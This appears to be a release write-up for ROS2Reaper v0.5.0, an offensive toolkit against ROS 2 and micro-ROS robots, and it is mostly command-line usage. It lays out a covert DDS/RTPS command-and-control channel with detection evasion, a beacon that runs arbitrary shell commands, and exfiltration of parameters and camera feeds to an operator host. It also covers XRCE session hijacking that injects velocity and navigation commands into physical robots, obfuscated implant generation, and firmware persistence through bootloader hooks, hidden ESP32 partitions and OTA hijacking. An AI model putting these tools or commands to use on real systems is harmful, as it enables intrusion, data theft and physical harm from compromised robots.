ROS2Reaper reaches v0.5.0 with two new attack phases: a covert DDS/RTPS command-and-control channel that hides inside legitimate ROS infrastructure traffic, and a full exploitation toolkit targeting micro-ROS deployments on constrained MCU hardware via the DDS-XRCE protocol.

> **Authorized use only.** Only use on systems you own or have explicit written authorization to test. Robotic systems can cause physical harm — ensure safety controls are in place before running any exploitation module.

---

## Where We Left Off

Previous phases covered the full attack surface of standard ROS 2 deployments — DDS/RTPS participant discovery, topic injection, node impersonation, amplification, ROS 1 legacy attacks, and a full ICS/OT bridge analysis layer covering Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT Greengrass, and Shodan-driven internet-wide exposure mapping.

The gaps were persistence and reach. You can find the fleet, enumerate the compute graph, inject into topics — but after initial access you need a reliable post-exploitation channel. And in embedded robotics environments the attack surface extends deep into constrained MCU hardware that doesn't speak standard DDS at all.

## Phase 4 — Post-Exploitation / C2

Phase 4 implements a covert command-and-control channel tunneled inside legitimate DDS/RTPS traffic. C2 payloads are XOR-encoded and wrapped in valid RTPS DATA submessages masquerading as eProsima Fast DDS — the most common ROS 2 middleware. The GUID prefix rotates per session (no persistent fingerprint) and beacon intervals are jittered ±25% to defeat timing-based detection.

The channel masquerades as standard ROS infrastructure topics (`/rosout`, `/diagnostics`, `/parameter_events`) and is invisible to network monitors that don't perform deep RTPS inspection.

```
Operator Machine                      Compromised ROS 2 Host
+----------------------+  covert RTPS  +----------------------------+
|  c2-server           | <-----------> |  c2-beacon                 |
|  (operator shell)    |  /rosout      |  (implant, jittered        |
|                      |  traffic      |   check-in interval)       |
+----------------------+               +----------------------------+
```

### c2-server

Listens for beacon check-ins and provides an interactive shell for session management and tasking. Multiple sessions are tracked concurrently — useful across a robot fleet.

```bash
# start C2 server on domain 0
python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth
```

Interactive shell commands:

```
sessions                      # list active sessions
use <session_id>              # attach to session (partial ID ok)
task shell ros2 topic list    # arbitrary command execution
task sysinfo                  # fingerprint the host
task ros_enum                 # enumerate nodes/topics/params
task topic_read /cmd_vel      # intercept velocity commands live
```

### c2-beacon

Deployed on the compromised ROS 2 host after initial access. Configurable check-in interval, TTL self-termination, and matching XOR key. Pure Python 3.8+ — no ROS dependencies required on the target.

```bash
python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey \
    --c2-interval 15 --c2-ttl 50 --skip-auth
```

Supported tasks:

| Task | Description |
|------|-------------|
| `shell <cmd>` | Execute arbitrary shell command, return stdout/stderr |
| `sysinfo` | Collect hostname, user, PID, ROS distro, domain ID |
| `ros_enum` | Enumerate ROS 2 nodes, topics, and parameters via CLI |
| `topic_read <topic>` | Read live messages from a specified ROS 2 topic |

### c2-exfil

Collects data on the compromised host and streams it back over chunked EXFIL packets. Large payloads are automatically split into 1400-byte segments (within UDP MTU) and reassembled on the operator side via `c2-recv`. Covers environment variables, filesystem reads up to 64KB, full ROS 2 parameter dumps across all nodes, and raw topic stream captures.

```bash
# dump all ROS 2 parameters from target
python3 ros2reaper.py c2-exfil --target <operator_ip> --exfil-mode params --skip-auth

# capture /camera/image_raw for 10 seconds
python3 ros2reaper.py c2-exfil --target <operator_ip> --exfil-mode topic \
    --topic /camera/image_raw --skip-auth

# receive and save on operator side
python3 ros2reaper.py c2-recv --c2-session <session_id> -o ros_params.txt --skip-auth
```

### Full Workflow

```bash
# 1. Start operator listener
python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth

# 2. Deploy beacon on compromised host (runs on the target)
python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey --c2-interval 15 --skip-auth

# 3. Interactive session management
#    sessions              <- see the new session appear
#    use <session_id>
#    task sysinfo          <- fingerprint the host
#    task ros_enum         <- map the ROS 2 compute graph
#    task shell ros2 topic list

# 4. Exfiltrate from the compromised host
python3 ros2reaper.py c2-exfil --target <operator_ip> --c2-key opskey --exfil-mode params --skip-auth

# 5. Receive on operator side
python3 ros2reaper.py c2-recv --c2-session <session_id> --c2-key opskey -o ros_params.txt --skip-auth
```

## Phase 5A — micro-ROS / DDS-XRCE

### The Embedded Blind Spot

Standard ROS 2 runs on full Linux hosts with DDS middleware baked in. The part that doesn't get talked about as much is everything downstream: constrained MCU-based nodes — Arduinos, STM32s, ESP32s, nRF52s — handling the low-level actuation and sensor work in production robotics deployments.

These devices run micro-ROS, which doesn't implement DDS natively. They speak DDS-XRCE (eXtremely Resource Constrained Environments) — a lightweight wire protocol designed for hardware with kilobytes of RAM. An XRCE Agent bridge (a separate Linux process) sits between the MCU nodes and the full ROS 2 graph, translating between XRCE and standard DDS.

XRCE Agents listen on **UDP/8888** by default, with alternative instances on ports **7400–7409**. Most deployments leave these open on the local network with no authentication.

Control the agent interaction and you can inject into any topic the MCU nodes publish or subscribe to, impersonate client sessions, and push commands to embedded hardware that may be directly driving physical actuators.

### Modules

| Module | Description |
|--------|-------------|
| `microros_agent.py` | XRCE Agent discovery via minimal HEARTBEAT probes. Fingerprints vendor/version. Enumerates connected MCU participants. |
| `xrce_traffic_analysis.py` | Passive XRCE traffic capture and behavioral baseline. Packet size distributions, timing, heartbeat intervals, per-session stats. |
| `microros_client_hijack.py` | Spoofed XRCE client session against a discovered agent. Injects Twist, PoseStamped, or raw CDR payload messages. |
| `microros_implant.py` | Generates complete micro-ROS C2 implant source for Arduino, C++, or Python targets. Obfuscation and decoy code injection. |
| `microros_persistence.py` | Firmware-level persistence: library patching, bootloader hooks, firmware injection, ESP32 partition hijack, OTA MITM. |
| `c2_dispatcher.py` | Interactive operator console. Routes commands to deployed implants via DDS topics or live agents via XRCE hijacking. |

### microros-agent

Uses minimal XRCE HEARTBEAT packets to probe for agents without triggering the full session handshake. Fingerprints vendor and version from response headers. `--xrce-enumerate` lists connected MCU participants — useful for mapping accessible embedded hardware before going active.

```bash
# sweep subnet for all XRCE agents
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json

# enumerate connected MCU participants on a specific agent
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth

# scan all common XRCE ports (8888, 7400-7409)
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth
```

### xrce-traffic

Passive baseline before touching anything. Packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, per-session and per-stream statistics. The output feeds into sizing and timing subsequent injections to blend with normal MCU traffic patterns.

```bash
# 60-second passive capture — JSON baseline + PCAP export
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
    --duration 60 -o baseline.json --pcap xrce_capture.pcap --skip-auth
```

### xrce-hijack

Creates a spoofed XRCE client session against a discovered agent and injects malicious DDS messages. Session ID is configurable — useful after profiling the legitimate client session IDs already in use on the network.

| Mode | Message Type | Use Case |
|------|-------------|----------|
| `twist` | `geometry_msgs/Twist` | Robot velocity command injection |
| `nav` | `geometry_msgs/PoseStamped` | Navigation goal hijack |
| `raw` | Arbitrary CDR payload | Inject any CDR-encoded message from hex or file |

```bash
# velocity injection — linear x + angular z
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth

# navigation goal hijack
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth

# raw CDR payload injection
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
    --topic /cmd_vel --payload-hex 0000803f00000000... --count 5 --skip-auth
```

### uros-implant

Generates complete micro-ROS C2 implant source code for three target platforms. The implant beacons periodically to a C2 callback topic and accepts tasking commands over DDS. Optional comment stripping and decoy code injection for basic static analysis evasion.

| Platform | Output | Use Case |
|----------|--------|----------|
| `cpp` | `.cpp` (ROS 2 node) | Full ROS 2 host or cross-compiled MCU |
| `arduino` | `.ino` (Arduino sketch) | Arduino-compatible boards with Ethernet/WiFi |
| `python` | `.py` (rclpy node) | Rapid prototyping, lab testing, soft implants |

```bash
# Arduino implant with 3-second beacon interval
python3 ros2reaper.py uros-implant --platform arduino \
    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth

# C++ implant with obfuscation + manifest export
python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
    --beacon-interval 10000 --manifest implants.json --skip-auth
```

### uros-persist

Establishes persistent implant presence at the firmware level. Five methods cover from soft (library patching, survives app reinstalls) to hard (bootloader hooks and partition modifications that survive OS wipes and factory resets).

| Method | Survives | Mechanism |
|--------|----------|-----------|
| `library_patch` | App reinstalls | Injects beacon into micro-ROS client library at .elf level |
| `bootloader` | OS wipe | Hooks bootloader entry to run implant before firmware loads |
| `firmware_inject` | Normal updates | Appends implant shellcode to an existing firmware image |
| `partition` | Factory reset | Creates a hidden partition in the ESP32 partition table |
| `ota_hijack` | Updates (MITM) | Generates OTA server config to serve malicious firmware on update |

```bash
# library patch against micro-ROS .elf firmware
python3 ros2reaper.py uros-persist --persist-method library_patch \
    --target firmware.elf --implant-id sensor_01 --implant-hex deadbeef... --skip-auth

# ESP32 hidden partition creation
python3 ros2reaper.py uros-persist --persist-method partition \
    --target partitions.csv --implant-file implant.bin \
    --partition-name implant_hidden --skip-auth

# OTA MITM config generation
python3 ros2reaper.py uros-persist --persist-method ota_hijack \
    --implant-id sensor_01 --ota-server ota.target.local --skip-auth
```

### uros-c2

The operator console for Phase 5A operations. Routes commands to deployed implants via DDS topics or directly to live XRCE agents via the hijacking module. Tracks the implant registry, manages task queues, and aggregates telemetry. Supports interactive mode for manual ops and batch mode for scripted assessment workflows.

```bash
# start interactive dispatcher with logging
python3 ros2reaper.py uros-c2 --log-file session.log --skip-auth
```

```
[dispatcher]> action uros_abc123 inject_twist lx=2.0 az=1.0
[dispatcher]> action uros_abc123 inject_nav x=10.0 y=5.0
[dispatcher]> action 10.0.0.5 inject_twist lx=5.0 port=8888
[dispatcher]> status implants
[dispatcher]> status tasks
```

### Full Pipeline

```bash
# 1. Discover XRCE agents on the subnet
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 \
    --xrce-enumerate -o agents.json --skip-auth

# 2. Build behavioral baseline (passive — no packets sent)
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 \
    --duration 60 -o baseline.json --pcap xrce.pcap --skip-auth

# 3. Hijack session and inject velocity command
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 \
    --xrce-attack twist --lx 1.5 --az 0.5 --count 10 --skip-auth

# 4. Generate persistent implant
python3 ros2reaper.py uros-implant --platform python \
    --implant-id lab_node_01 --beacon-interval 5000 --skip-auth

# 5. Establish firmware-level persistence
python3 ros2reaper.py uros-persist --persist-method partition \
    --target partitions.csv --implant-file implant.bin --skip-auth

# 6. Start C2 dispatcher and receive implant beacons
python3 ros2reaper.py uros-c2 --log-file lab_session.log --skip-auth
```
